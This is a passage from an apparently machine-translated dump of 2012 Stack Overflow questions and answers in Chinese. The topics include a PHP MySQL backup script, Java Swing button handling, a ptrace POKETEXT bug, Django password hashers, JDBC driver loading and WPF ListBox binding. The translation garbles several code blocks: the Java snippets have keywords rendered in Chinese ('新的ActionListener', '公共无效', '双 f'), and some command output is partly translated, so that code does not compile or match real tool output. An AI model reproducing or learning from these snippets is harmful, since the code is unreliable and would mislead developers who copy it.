$actconn = mysql_connect($dbhost, $actdbuser, $actdbpass) or die ('act Error connecting to mysql');
$bckconn = mysql_connect($dbhost, $bckdbuser, $bckdbpass) or die (' back Error connecting to mysql');

$actdbname = '`web151-tevenyal`';
mysql_select_db($actdbname, $actconn);

$bckdbname = '`web151-bckproba`';
mysql_select_db($bckdbname, $bckconn);

//end opendb

//functions
function test($sqls, $states){
 if ($sqls=1){
   $resflag=1;
 }
 else {
   $resflag=0;
 }
 $statsql="INSERT INTO `web151-tevenyal`.`tex_bcklog` (`what`,`how`,`when`) VALUES ('$states',$resflag,CURDATE());";
 echo "<p>".$sqls."<br/>".$statsql."</p>"; 
 $statresult=mysql_query($statsql, $actconn) or die(mysql_error());
 echo "<p>".$states." - ".$resflag."</p>";
 $emaltext=$emailtext.$sqls;
}

function db_rows($db,$ord, $connectdb){
 $dbquery="SELECT azon FROM $db ORDER BY azon $ord LIMIT 1";
 $dbresult=mysql_query($dbquery, $connectdb);
 $row = mysql_fetch_array($dbresult);
 $dbrow = $row['azon'];
 return $dbrow;
}
// end of functions

//config information...
$acttable  = 'adat';
$today = date("yW_Hi");
$newdb = $bckdbname.".test_".$today;
test($permsql, "grant");
test(1, "backupstart");

//creating log table for backup results
$backtablesql="CREATE TABLE IF NOT EXISTS `tex_bcklog` ( `azon` int(11) NOT NULL AUTO_INCREMENT,`what` varchar(255) CHARACTER SET utf8 NOT NULL,  `how` varchar(255) CHARACTER SET utf8 NOT NULL,  `when` date NOT NULL,   PRIMARY KEY (`azon`)) ENGINE=MyISAM  DEFAULT CHARSET=latin1 ;" ;
//$backtableresult=mysql_query($backtablesql);

$firstact= db_rows($actdbname.".".$acttable,"asc", $actconn);
$lastact= db_rows($actdbname.".".$acttable,"desc", $actconn);
$upto=$firstact+25000;

if ($lastact-$firstact>50000) {

 //create a new table 
 $permsql="GRANT SELECT ON `$actdbuser`.* TO `$bckdbuser`@'%' ;";
 test($permsql, "grant");
 $perm = mysql_query($permsql, $bckconn) or die(mysql_error());

 $newdbsql="CREATE TABLE $newdb LIKE $actdbname.`$acttable`";
 test($newresult, "createdb");
 $newresult = mysql_query($newdbsql, $bckconn) or die(mysql_error());

 // copy all the data
 $query = "INSERT INTO $newdb SELECT * FROM $actdbname.$acttable WHERE $acttable.azon < $upto";
 test($query, "copyrows");
 $result = mysql_query($query) or die(mysql_error());

 // so what has happened...
 $delquery = "DELETE FROM $actdbname.$acttable WHERE $actdbname.$acttable.azon < $upto";
 test($delquery, "deleterows");
 $delresult = mysql_query($delquery, $actconn);

 // then tidy up everything:)
 $res = mysql_query('SHOW TABLE STATUS WHERE Data_free / Data_length > 0.1 AND Data_free >  102400', $actconn);
 while($optrow = mysql_fetch_assoc($res)) {
   mysql_query('OPTIMIZE TABLE ' . $optrow['Name']);
  }
 }
 else {
  test(0, "nothing");
 }

 // send an email to confirm what's happened - thanks:)

 // close db 
 mysql_close($actconn);
 mysql_close($bckconn);
 ?> 
```

请先修复它，然后评论任何 PDO，除非解决方案本身:) 任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T21:34:26.247

在失败的函数内部（在另一个函数中正确完成`db_rows()`），您的数据库资源链接变量超出范围。将它们作为参数传递给函数：

例如，在`$connection`这里传递一个：

```
function test($sqls, $states, $connection){
 if ($sqls=1){
   $resflag=1;
 }
 else {
   $resflag=0;
 }
 $statsql="INSERT INTO `web151-tevenyal`.`tex_bcklog` (`what`,`how`,`when`) VALUES ('$states',$resflag,CURDATE());";
 echo "<p>".$sqls."<br/>".$statsql."</p>"; 
 $statresult=mysql_query($statsql, $connection) or die(mysql_error());
 echo "<p>".$states." - ".$resflag."</p>";
 $emaltext=$emailtext.$sqls;
} 
```

然后使用正确的连接调用函数，如下所示：

```
test($permsql, "grant", $actconn); 
```

# java - 一个基于用户输入调用成员函数的 JButton

> ID：11820233
> 
> 赞同：0
> 
> 时间：2012-08-05T21:30:42.317
> 
> 标签：java, swing, jbutton, jradiobutton

给定一个 GUI 应用程序，用户将选择两个单选按钮之一`JRadioButton a`，或`JRadioButton b`。根据他的选择，他将输入不同的输入。但是，要计算公式，他将单击常规按钮，`JButton c`。

但是，当在`ActionListener`.

```
      c = new JButton("c");
      c.addActionListener(新的ActionListener(){
        @覆盖
        公共无效actionPerformed（ActionEvent e）{
          cActionPerformed(e);
        }
      });

```

因为在 内`ActionEvent`，我们有，

```
    公共无效cActionPerformed（ActionEvent ev）{
      尝试 {
        双 f = foo.blah(x, y);
        双 b = bar.meh( y, z );
      }
      捕捉（NumberFormatException e）{
        JOptionPane.showConfirmDialog(
        null, "错误消息。", "错误", JOptionPane.CANCEL_OPTION
        );
      }
    }

```

但是，程序仅在调用堆栈中下降一层，返回`catch`异常对话框。如何做到这一点，以便当用户按下按钮时`c`，根据是否选择`a`或`b`，他分别得到`f`或`b`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T03:57:07.277

程序进入`catch`块的问题与确定选择了哪个单选按钮无关。它可以进入 catch 块的唯一方法`NumberFormatException`是抛出 a 。可以抛出a 的唯一方法`NumberFormatException`是它来自`foo.blah( x, y );`or `bar.meh( y, z );`。

所以 - 您需要首先弄清楚为什么您的函数会抛出该异常。然后你可以应用 La bla bla 的答案。

找出错误在哪里抛出的一个好方法是`e.printStackTrace()`在你的`catch`. 这会将堆栈跟踪打印到控制台输出，将您指向导致问题的确切代码行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T21:40:53.580

您可以使用`isSelected()`单选按钮选项。

```
JRadioButton f = new JRadioButton();
JRadioButton b = new JRadioButton();

public void cActionPerformed( ActionEvent ev ) {
      try {
        if(f.isSelected()){

            double f = foo.blah( x, y );

         } else if(b.isSelected()){

            double b = bar.meh( y, z );

         } else { // If none is selected
            // Do something
         }
      }
      catch( NumberFormatException e ) {
        JOptionPane.showConfirmDialog(
        null, "Error message.", "Error", JOptionPane.CANCEL_OPTION
        );
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T21:35:28.350

您可以使用`getSource()`继承自的方法`EventObject`来区分事件的来源。

例子：

```
 public void actionPerformed(ActionEvent event) {
    if (event.getSource() == button1) {
      setSize(300, 200);
      doLayout();
    } else if (event.getSource() == button2) {
      setSize(400, 300);
      doLayout();
    } else if (event.getSource() == button3) {
      setSize(500, 400);
      doLayout();
    } 
```

# c# - 允许用户远程连接mysql db

> ID：11820235
> 
> 赞同：2
> 
> 时间：2012-08-05T21:30:49.613
> 
> 标签：c#, mysql, whitelist, remote-connection

首先，我看了一下她关于这个问题的每一个相关话题。然而，他们都没有成功地完全回答我的问题。

目前我正在开发一个用 C# 编码的桌面应用程序，它需要 mysql 连接来进行身份验证和存储用户自定义列表等。

我将我的测试数据库放在我在 hostgator 上的帐户中，并使用如下所示的连接字符串连接到它；

```
public static string cs = "Server=xx.xx.xxx.xx;Port=3306;Database=xxx;Uid=xx;Password=xxx"; 
```

尽管一切都是 100% 正确的，但在我将自己的 IP 地址列入白名单之前，连接是不可能的。

现在一切对我来说都很完美，但问题是我应该如何将我的桌面应用程序的所有用户列入白名单，以便他们能够连接到数据库。

我可以做些什么来允许连接而不必将所有人列入白名单？

提前谢谢你
亚历克斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:37:11.137

是的，这可能是一个 MySQL（甚至可能是防火墙）配置选项。我想尽管由于明显的安全问题，托管商不允许每个人都连接到托管的 MySQL 服务。

您最好编写一个在网络服务器上运行的简单服务，该服务将发布您希望共享的数据。然后，您可以在您的 C# 应用程序中使用此服务。

# string - 可捕获的致命错误：无法将对象转换为字符串

> ID：11820238
> 
> 赞同：0
> 
> 时间：2012-08-05T21:31:17.997
> 
> 标签：string, string-concatenation, php

在我的 Zend Framework 应用程序中，我收到此错误：

`Catchable fatal error: Object of class User could not be converted to string in /home/trengine/domains/completeset.us/application/models/User.php on line 121`

第 121 行是这个 mySql 查询中的 where 子句：

```
$query = "SELECT first,
                         last,
                         email,
                         gender,
                         user_type,
                         country,
                         state,
                         province,
                         city,
                         DATE_FORMAT(birthday, '%m/%d/%Y') AS birthday,
                         facebook_id
                         FROM users
                         WHERE user_id = '{$this->id}'"; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T21:55:35.433

在调用数据库之前将其放入：

```
var_dump($this->id); 
```

这将显示您正在处理的变量类型。很可能 id 已被强制转换为沿线某处的对象。

另外，我提前道歉......但您应该查看 Zend DB Table Abstract 并从中扩展。您会发现执行您需要对项目进行的任何更改都变得容易得多。

# python - 如何以编程方式确定 PDF 是否可搜索？

> ID：11820241
> 
> 赞同：6
> 
> 时间：2012-08-05T21:32:08.680
> 
> 标签：python, bash, pdf, pdftk

我有一个带有 PDF 的 URL 列表的 CSV：

*   其中一些 PDF 是可搜索的。
*   其中一些 PDF 文件不可搜索。

我想确定可以从我的 PDF 列表中搜索哪些 PDF。是否有捷径可寻？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-05T22:14:48.600

在命令行上，我会`pdffonts`用来确定文件使用的字体。这也运行得相当快......

## 示例 1：包含文本的 PDF

```
pdffonts bash-manpage.pdf

  名称 类型 编码 emb sub uni 对象 ID
  ------------------------------- ------------- ------ --------- --- --- --- ---------
  Times-Roman Type 1 Custom no no no 8 0
  Times-Bold Type 1 标准 no no no 9 0
  Helvetica Type 1 自定义 no no no 11 0
  Helvetica-Bold Type 1 标准 no no no 30 0

```

## 示例 2：仅包含图像的 PDF

```
pdffonts 扫描书.pdf

  pdf字体手工制作.pdf
  名称 类型 编码 emb sub uni 对象 ID
  ------------------------------- -------------- ----- --------- --- --- --- ---------

```

1.  示例 1 显示了一个带有字体名称的表格。这意味着有要**搜索**的文本。

2.  示例 2 显示了一个空表。没有字体，没有要搜索的文本（除非您在文件上运行 OCR 以首先嵌入任何找到的文本……但随后您创建了一个不同的文件！），不要回头看这些……

**注意：**要成功地实际提取嵌入的文本并因此能够搜索它是一个完全不同的问题。在许多情况下，您会发现它非常困难——尤其是当您在字体表中看到字体类型时，例如`CID Type`使用*“自定义”*编码。您可能首先想在 stackoverflow 中搜索有关从 PDF 中[提取文本的其他问题...](https://stackoverflow.com/search?q=%5Bpdf%5D%20text%20extract)

# php - 页面加载时附加到 url 的奇怪代码

> ID：11820242
> 
> 赞同：0
> 
> 时间：2012-08-05T21:32:12.543
> 
> 标签：php, .htaccess, redirect

我的页面加载时发生了一些奇怪的事情。

它似乎总是将 #.UB7lYmMk67s 附加到 url 的末尾，这对访问者来说并不好看。

我已经确认它不是我的 javascript 代码或自定义 PHP 包含函数。

有没有人有任何想法可能导致这种情况？

在这里你可以看到它：

[http://www.caketopper.co.uk/2012/animal-cake-toppers/christening-bear](http://www.caketopper.co.uk/2012/animal-cake-toppers/christening-bear)

您会注意到，一旦页面加载完成，这个垃圾就会被添加到它的末尾。

我的 .htaccess 看起来不错，但无论如何都是这样：

```
RewriteEngine On

RewriteRule ^cake-toppers/([a-z\-]+)$ topper-page.php?topperurlname=$1
RewriteRule ^animal-cake-toppers/([a-z\-]+)$ topper-page.php?topperurlname=$1
RewriteRule ^people-cake-toppers/([a-z\-]+)$ topper-page.php?topperurlname=$1 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-05T21:39:27.910

这是因为您使用的是“AddThis”。请参阅他们的[点击跟踪常见问题解答](http://support.addthis.com/customer/portal/articles/381252-click-tracking)。

`#.UB7ng88cJxk`（当我转到该支持链接时，它似乎附加了一个）。

如果你想禁用它，它会说在你的 AddThis 代码中包含这个脚本：

```
<script type="text/javascript"> 
var addthis_config = {
     data_track_clickback: false 
} 
</script> 
```

# authentication - Play Framework：如何在用户注册时使用 Secure 模块自动登录？

> ID：11820243
> 
> 赞同：0
> 
> 时间：2012-08-05T21:32:13.580
> 
> 标签：authentication, playframework, playframework-1.x

我正在使用 Play Framework 1.2.4

我的主控制器受到“安全”模块的保护。

现在，我需要添加一个进程来为系统注册一个新用户。我在另一个控制器中实现它。假设注册过程成功，我想为新创建的用户显示“主页”，而不要求再次输入用户名/密码。

如何做到这一点？

一些“简化”的代码：

在注册控制器中：

```
public static void newUser(String username, String password, String fullname)
{
   User user = new User(username, password, fullname);
   user.save();
   // What is the trick to avoid login being displayed???
   MainController.index();
 } 
```

MainController 正在使用“安全”模块。

感谢您的任何提示，

最大限度

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T21:37:00.270

好吧，看起来答案就在这里： [How to use play frameworks Secure module to login a user after that user has been created](https://stackoverflow.com/questions/7103544/how-to-use-play-frameworks-secure-module-to-login-a-user-after-that-user-has-bee?rq=1)

我发帖后才发现。

最大限度

# wpf - 带有 DataTemplate 的 ListBox 的 SelectedItem

> ID：11820244
> 
> 赞同：2
> 
> 时间：2012-08-05T21:32:26.343
> 
> 标签：wpf, listbox, datatemplate, selecteditem

我有一个列表框：

```
<ListBox Name="lbsfHolder" 
         ItemsSource="{Binding UISupportingFunctions}"
         SelectedItem="{Binding Path=SelectedSupportedFunction, Mode=TwoWay}"
         SelectionMode="Multiple"
         IsSynchronizedWithCurrentItem="True"
         HorizontalContentAlignment="Stretch">
    <ListBox.ItemTemplate>
        <DataTemplate>
            <controls:SupportingFunction GotFocus="SupportingFunction_GotFocus"/>
        </DataTemplate>
    </ListBox.ItemTemplate>
</ListBox> 
```

在 ViewModel 我有：

```
private SupportingFunction _selectedSupportedFunction;

public SupportingFunction SelectedSupportedFunction
{
    get { return _selectedSupportedFunction; }
    set
    {
        _selectedSupportedFunction = value;
        NotifyPropertyChanged("SelectedSupportedFunction");
    }
} 
```

但是当我试图选择列表框中的任何项目时，什么都没有发生。对于 ListBox 和 SelectedValue，SelectedItem 也为空。我是否需要添加一些特殊代码才能完成这项工作？

**升级版：**

我已经改变了一些看法，现在我有：

```
<UserControl x:Class="RFM.UI.WPF.Controls.SupportingFunction">
    <Grid>
        <ListBox Name="supportingFunctions"
                 ItemsSource="{Binding UISupportingFunctions}"
                 SelectedItem="{Binding Path=SelectedSupportedFunction, Mode=TwoWay}"
                 SelectionMode="Multiple"
                 IsSynchronizedWithCurrentItem="True"
                 HorizontalContentAlignment="Stretch">
            <ListBox.ItemContainerStyle>
                <Style TargetType="{x:Type ListBoxItem}">
                    <Setter Property="Template">
                        <Setter.Value>
                            <ControlTemplate>
                                <Grid>
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="30" />
                                        <ColumnDefinition />
                                        <ColumnDefinition Width="30" />
                                    </Grid.ColumnDefinitions>
                                    <TextBox Name="tbsfName" Grid.Column="0" Text="{Binding Path=Title, Mode=TwoWay}"></TextBox>
                                    <TextBox Name="tbsfExperssion" Grid.Column="1" Text="{Binding Path=Expression}" HorizontalAlignment="Stretch"></TextBox>
                                    <Button Name="bsfDel" Grid.Column="2">Del</Button>
                                </Grid>
                            </ControlTemplate>
                        </Setter.Value>
                    </Setter>
                </Style>
            </ListBox.ItemContainerStyle>
        </ListBox>
    </Grid>
</UserControl> 
```

在放置此控件的页面中：

```
<StackPanel Name="spSupportingFunctions">
            <StackPanel Name="spsfOperations" Orientation="Horizontal">
                <Button Name="bsfAdd" Width="30" Command="commands:CustomCommands.AddSupportingFunction">Add</Button>
            </StackPanel>
            <controls:SupportingFunction DataContext="{Binding Self}" />                
        </StackPanel> 
```

在本页后面的代码处

```
public PlotDataPage()
    {
        DataContext = new PlotDataViewModel();
        InitializeComponent();            
    } 
```

这是 PlotDataViewModel 的完整列表

```
public class UISupportingFunction : ISupportingFunction
{
    public string Title { get; set; }
    public string Expression { get; set; }
}

public class PlotDataViewModel : INotifyPropertyChanged
{
    public PlotDataViewModel Self
    {
        get
        {
            return this;
        }
    }

    private ObservableCollection<UISupportingFunction> _supportingFunctions;
    public ObservableCollection<UISupportingFunction> UISupportingFunctions
    {
        get
        {
            return _supportingFunctions;
        }
        set
        {
            _supportingFunctions = value;
            NotifyPropertyChanged("UISupportingFunctions");
        }
    }       

    private UISupportingFunction _selectedSupportedFunction;
    public UISupportingFunction SelectedSupportedFunction
    {
        get
        {
            return _selectedSupportedFunction;
        }
        set
        {
            _selectedSupportedFunction = value;
            NotifyPropertyChanged("SelectedSupportedFunction");
        }
    }

    public PlotDataViewModel()
    {
        UISupportingFunctions = new ObservableCollection<UISupportingFunction>();           
    }

    public void CreateNewSupportingFunction()
    {
        UISupportingFunctions.Add(new UISupportingFunction() { Title = Utils.GetNextFunctionName() });
    }

    private void NotifyPropertyChanged(string info)
    {
        if (PropertyChanged != null)
            PropertyChanged(this, new PropertyChangedEventArgs(info));
    }

    public event PropertyChangedEventHandler PropertyChanged;       
} 
```

单击添加按钮时，我只是在调用 CreateNewSupportingFunction() 方法。一切看起来都很好 - 添加了这些项目，我看到了它们。但是，当我单击其中一个文本框，然后单击每个项目右侧的 bsfDel 按钮时，我在 SelectedSupportedFunction 中得到空值。

也许是因为焦点事件是由 TextBox 而不是 ListBox 处理的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:38:48.907

要么是您的 ItemsSource UISupportingFunctions 不是 SupportingFunction 对象，要么是您没有将 View 的 Datacontext 设置为 ViewModel。

ViewModel.xaml.cs

```
this.DataContext = new ViewModelClass(); 
```

# sql - 使用关联数组键时插入 PDO 准备语句中的不需要的字符

> ID：11820245
> 
> 赞同：0
> 
> 时间：2012-08-05T21:32:35.127
> 
> 标签：sql, insert, pdo

我创建了一个使用关联数组键的 PDO 语句，但是在执行 SQL 时添加了“\”和“'”，我该如何防止这种情况发生？

这是查询

```
public function queryUpdateClasses($classesToUpdate,$packageId){
        $sql = "SELECT class.ClassId FROM class JOIN package ON package.PackageId = class.PackageId WHERE class.ClassName = ? AND package.PackageId = ?";
        $query = $this->_conn->prepare($sql);
        foreach($classesToUpdate as $updateKey=>$updateValue){
            echo $updateKey;
            $query->execute(array($updateKey,$packageId));
        }
    } 
```

这是日志文件的输出

```
98 Query    SELECT class.ClassId FROM class JOIN package ON package.PackageId = class.PackageId WHERE class.ClassName = '\'LogActivityTable\'' AND package.PackageId = '69' 
```

当您`$updateKey;`回显时，它只显示“LogActivityTable”。

# symfony-1.4 - Symfony - 从表单中访问相关的表字段

> ID：11820246
> 
> 赞同：0
> 
> 时间：2012-08-05T21:32:53.690
> 
> 标签：symfony-1.4

是否可以获取表单中字段的相关表的属性？我正在尝试获取属于 OriginalStone 模型类的名为“getIdentifier”的属性。

```
<?php foreach ($form['treatedStones'] as $fields):?>
     <?php $fields['original_stone_id']->renderRow() ?>
<?php endforeach?> 
```

我希望我可以做类似的事情：

```
<?php foreach ($form['treatedStones'] as $fields):?>
     <?php $fields['original_stone_id']->getObject()->getIdentifier() ?>
<?php endforeach?> 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:45:37.330

我假设`treatedStones`是一种嵌入的学说形式。尝试`$form->getEmbeddedForm('treatedStones')->getObject()->getOriginalStone()->getIdentifier()`

# c - 使用多个进程将 malloc() 转换为 SYS V 共享内存

> ID：11820248
> 
> 赞同：2
> 
> 时间：2012-08-05T21:33:30.633
> 
> 标签：c, linux, malloc, shared-memory, huge-pages

我正在改进一个程序以在 Linux 中使用静态分配的大页面，而不是标准的 4Kb 页面。我已经建立了一个支持静态大页面的系统，并在大页面池（/prov/sys/vm/nr_hugepages）中分配了大量的大页面。我现在希望通过程序找到大型 malloc() 发生的位置，以便我可以删除 malloc() 并将其替换为设置了 SHM_HUGETLB 标志的 shmget/shmat。

请记住，这是高度并发的程序。

我使用共享内存的目标不是以共享方式实际使用内存。我想保留 malloc() 例程的所有功能，同时只使用静态分配的大页面支持。

下面是我要完成的示例代码段。在程序达到这一点之前，它已经分叉了许多进程。每个进程将同时执行这段代码。最初，该段仅包含以下代码：

```
if( !( PANEL->WORK = (void *)malloc( (size_t)(lwork) *
                                   sizeof( double ) ) ) )
 {
    HPL_pabort( __LINE__, "HPL_pdpanel_init",
             "Memory allocation failed" );
 } 
```

哪个工作正常。

现在我已将其修改为：

注意！！：我使用随机数作为密钥，因此每个进程都有一个随机密钥来标识它的独立内存分配。

```
int shmid1;
size_t dsize = (size_t)(lwork) * sizeof( double );

/*2097152 is 2MB or the huge page size, if memory request is less, 
  resort to standard malloc */
if( dsize < 2097152) {
  if( !( PANEL->WORK = (void *)malloc(dsize) ) )
  {
     HPL_pabort( __LINE__, "HPL_pdpanel_init",
                 "Memory allocation failed" );
  }
}
else {
  /* Get random number to use as a key */
  int randomData = open("/dev/random",O_RDONLY);
  int random;
  read(randomData, &random, sizeof(random));
  close(randomData);
  /* Get shared memory segment */
  shmid1 = shmget(random, dsize, SHM_HUGETLB
     | IPC_CREAT | SHM_R
     | SHM_W);
  if ( shmid1 < 0 ) {
  perror("shmget");
  exit(1);
  }
  printf("HugeTLB shmid: 0x%x\n", shmid1);
  PANEL->WORK = (void *)shmat(shmid1, 0, 0);
} 
```

每当我尝试从 PANEL->WORK 读取时，使用这个新实现时，我都会遇到分段错误。在我真正开始深入研究为什么这是段错误之前，我不禁想知道我是否正确地处理了这个问题。这是解决这个问题的最佳方法吗？有人认为这种方法有错误吗？

# django - 未找到哈希

> ID：11820254
> 
> 赞同：2
> 
> 时间：2012-08-05T21:34:18.703
> 
> 标签：django, authentication, sha, pbkdf2

我正在尝试在 django 1.4 中使用不同的哈希器。我的应用程序“帐户”中有一个哈希文件“hashers.py”，

```
import hashlib

from pbkdf2 import pbkdf2
from django.contrib.auth.hashers import SHA1PasswordHasher
from django.utils.crypto import pbkdf2

class SHA512PasswordHasher(SHA1PasswordHasher):
    algorithm = "sha512" 
```

我添加到设置中，

```
PASSWORD_HASHERS = (
    'accounts.hashers.SHA512PasswordHasher',
) 
```

我得到以下异常值，

异常值：

> 未找到哈希：accounts.hashers.SHA512PasswordHasher

另外，如果我没有

> 从 pbkdf2 导入 pbkdf2

我收到以下错误，

> 异常值：
> 
> 未知密码散列算法“pbkdf2_sha256”。您是否在 PASSWORD_HASHERS 设置中指定了它？

即使我在主 django 库中使用任何已经编写好的哈希。可能是一个错误？

无论如何，为什么找不到我的新哈希器。我遵循了 django 文档中所写的内容。 [https://docs.djangoproject.com/en/dev/topics/auth/](https://docs.djangoproject.com/en/dev/topics/auth/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-14T19:54:18.337

对于设置，您应该将哈希添加到列表中，而不是替换它。所以像这样编码：

```
PASSWORD_HASHERS += (
    'accounts.hashers.SHA512PasswordHasher',
) 
```

# python - wxPython 或 wxPython 中的 PyGame 画布 -> 哪个更快？

> ID：11820258
> 
> 赞同：1
> 
> 时间：2012-08-05T21:34:47.223
> 
> 标签：python, opencv, wxpython, pygame

我的目标是使用 OpenCV 尽可能高效地从网络摄像头捕获帧。目前，我能够使用标准绘图上下文 (BufferedPaintDC) 将 30FPS 6408*480 绘图直接捕获到 wxPython 面板上，CPU 使用率约为 15%（较旧的 Core Duo 处理器）。我很好奇的是，如果我在 wxPython 框架中嵌入 PyGame 画布，并直接绘制到 PyGame 画布，我会看到什么样的性能提升（如果有的话）。

我不确定瓶颈是否是 wxPython 框架，以及嵌入 PyGame 画布是否真的可以做任何事情。还是 wxPython 框架只是像一个容器一样，对 PyGame 画布没有影响？我希望我在这里有意义。

另一种选择是专门使用 PyGame，但是我真的很喜欢 wxPython 小部件的功能，所以我不想失去它。

或者是否有更快的画布可以集成到我不知道的 wxPython 中？

想法？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T17:32:50.743

我不知道您为什么要将游戏库嵌入到 wxPython 中以期获得性能提升。就个人而言，我认为这不会发生。您应该查看 wxPython 提供的当前支持的绘图画布，或者解释您正在尝试做什么。人们已经在 wxPython 中完成了游戏......

反正今天wx的主要绘图接口是wx.GCDC/wx.GraphicsContext，cairo，FloatCanvas，或者GLCanvas。当然，还有 wx.DC、wx.PaintDC 和你找到的那个。

# java - 尝试从 servlet 调用 JDBC 时抛出 NullPointerException

> ID：11820259
> 
> 赞同：1
> 
> 时间：2012-08-05T21:34:57.863
> 
> 标签：java, html, jsp, web-applications, servlets

我正在运行我的 servlet `RegistrationServlet`，并尝试创建一个 Database 对象

这是小服务程序：

```
@WebServlet("/register")
public class RegistrationServlet extends HttpServlet 
{
    private static final long serialVersionUID = 1L;

    @Override

    public void doGet(HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException 
    {
        // create a new connection to mysql database  , with this we put the new client in the database 

        Database myDabatase = null;

        try {
            myDabatase = new Database();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }  // create a new database 

        myDabatase.createDatabaseAndTables();  // create the tables of the database

        HttpSession session = request.getSession();
        synchronized(session) 
        {

              boolean returnValue = myDabatase.addNewClient("david", "cole", "jamie", "123456789", "johnny", "blabla");     

          if (returnValue == true)  // client was added 
          {
              String addressPath = "/WEB-INF/results/show-name.jsp";
              RequestDispatcher dispatcher = request.getRequestDispatcher(addressPath);
              dispatcher.forward(request, response);
          }

          else if (returnValue == false)  // client was not added becuase he's already registered 
          {

          }

        }
    }

} 
```

这是完整的课程：

但是当我在我的 servlet 中执行该行时：

```
boolean returnValue = myDabatase.addNewClient("david", "cole", "jamie", "123456789", "johnny", "blabla"); 
```

我得到一个 NullPointerException 说：

```
java.lang.ClassNotFoundException: com.mysql.jdbc.Driver
    at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1711)
    at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1556)
    at java.lang.Class.forName0(Native Method)
    at java.lang.Class.forName(Unknown Source)
    at db.Database.<init>(Database.java:18)
    at servlets.RegistrationServlet.doGet(RegistrationServlet.java:28)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722) 
```

这导致我上线：

```
Class.forName("com.mysql.jdbc.Driver"); 
```

在`Database`类的构造函数中，正如您在跟踪中看到的那样：

```
java.lang.ClassNotFoundException: com.mysql.jdbc.Driver 
```

但是，当我执行与主程序相同的程序时：

```
public class Main {

    public static void main(String [ ] args) throws Exception
    {

        Database myConnection = new Database();
        myConnection.createDatabaseAndTables();
        boolean returnValue = myConnection.addNewClient("david", "cole", "jamie", "123456789", "johnny", "blabla");

    }

} 
```

一切都很好，我没有得到 NullPointerException 。

那么如果我从一个 servelt 做同样的事情有什么问题呢？为什么 NullPointerException ？

问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T21:48:11.670

运行 servlet 时，类路径中缺少 MySQL 驱动程序。可能需要将带有驱动程序的 JAR 文件添加到 webapp 的 WEB-INF/lib 目录中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T21:42:54.320

确保 mysql 驱动程序 jar 位于您的 lib 文件夹中（或类路径，如果它的控制台应用程序）。尝试指定 mysql 的端口（如果没有更改，则为 3306）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T21:45:06.563

MySQL jar 从您的服务器容器的类路径中丢失，而当您运行独立的主应用程序时它存在。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-11-26T01:38:37.407

我在同一行中遇到了同样的问题，但我通过将用于 MySQL 连接的 JAR 添加到项目中来解决它。

之前，它没有包含在项目中，因为连接的所有数据都已添加到服务器配置（Payara Server 5）中，因此在服务器上显示项目时不会发生错误。但是，在 JUnit 中运行它时没有考虑到这一点，因此需要添加 JAR 以直接从项目而不是从服务器建立连接。

我希望这对那些有同样问题的人有用。

# linux - 带有请求 PTRACE_POKETEXT 的 ptrace 失败

> ID：11820260
> 
> 赞同：1
> 
> 时间：2012-08-05T21:34:59.220
> 
> 标签：linux, ptrace

我正在尝试在跟踪的进程中注入代码...我能够正确读取寄存器（`PTRACE_GETREGS`）并且也可以`PTRACE_PEEKTEXT`工作...我已经使用 GDB 进行了验证。但是，如果我`ptrace`用`PTRACE_POKETEXT`请求调用它会返回`0`但在同一地址再次读取我找不到预期的字节：

```
void print_word(long res) {
    char *datap = (char *)&res;

    if (res == -1)
        //check errno for errors
    else
        printf("%02X %02X %02X %02X\n", datap[0], datap[1], datap[2], datap[3]);
}

....

long res, data = 0xAABBCCDD;

res = ptrace(PTRACE_PEEKTEXT, pid, (void *)regs.eip, NULL);
print_word(res);
res = ptrace(PTRACE_POKETEXT, pid, (void *)regs.eip, (void *)&data);
if (res != 0)
    //error
res = ptrace(PTRACE_PEEKTEXT, pid, (void *)regs.eip, NULL);
print_word(res); 
```

第一个`print_word`精确打印 GDB 显示的四个字节。第二个`print_word`代替打印奇怪的字节而不是`0xAABBCCDD`.

有任何想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-05T22:19:41.370

您从第二个获得的那些奇怪字节`ptrace(PTRACE_PEEKTEXT, ...)`应该与 的地址匹配`data`- 将它们与 . 的值进行比较`&data`。

尽管 的手册页将参数`ptrace(2)`显示为，但对于请求，它包含请求值。使用*address-of*运算符，您实际上是戳值的地址而不是值本身。正确的调用如下：`data``void *``PTRACE_POKETEXT``data`

 *```
res = ptrace(PTRACE_POKETEXT, pid, (void *)regs.eip, (void *)data); // w/o &
if (res != 0)
    //error 
```*

# css - 流体背景图像上的流体图像

> ID：11820264
> 
> 赞同：1
> 
> 时间：2012-08-05T21:35:35.140
> 
> 标签：css, wordpress, responsive-design

我需要你的帮助！我的客户想要一个全屏背景的 wordpress 页面。在其中一页上，我需要在全屏背景图像上放置 3 个图像，这些图像保持在准确的位置并且本身是流动的。图像上的 3 个人应该是可选的，并且会有一个灯箱，其中包含有关他们的信息。

这应该是这样的：

![在此处输入图像描述](../Images/1efc926b917ab7b618cd9c24324153c1.png)

这是背景的定位方式：

```
.bg{
    background: url(images/gang.jpg);
